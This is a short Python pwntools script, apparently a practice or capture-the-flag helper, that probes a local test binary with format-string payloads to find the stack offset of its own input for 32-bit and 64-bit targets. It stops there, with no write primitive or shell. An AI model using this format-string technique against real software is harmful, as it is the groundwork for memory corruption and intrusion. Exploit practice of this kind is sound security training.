from pwn import *

def info(s):
    log.info(s)

def findPos(r,mul):
    found = False
    n = 0
    while not found:
        n += 1
        payload = 'A'*mul + ' %{}$lx'.format(n)
        r.sendline(payload)
        data = r.recvline()
        if '41'*mul in data:
            found=True
            print (data)
            info('Position found at %{}$lx'.format(n))

    return n

def exploit(r,elfclass):
    if (elfclass==64):
        info('Exploit 64 bit binary')
        pos = findPos(r,8)
    else:
        info('Exploit 32 bit binary')
        pos = findPos(r,4)


if __name__ == "__main__":
    info('Initializing')
    file = './ctest/test'
    r = process(file)
    e = ELF(file)
    print util.proc.pidof(r)
    info('File loaded, begin exploiting')
    pause()
    exploit(r,e.elfclass)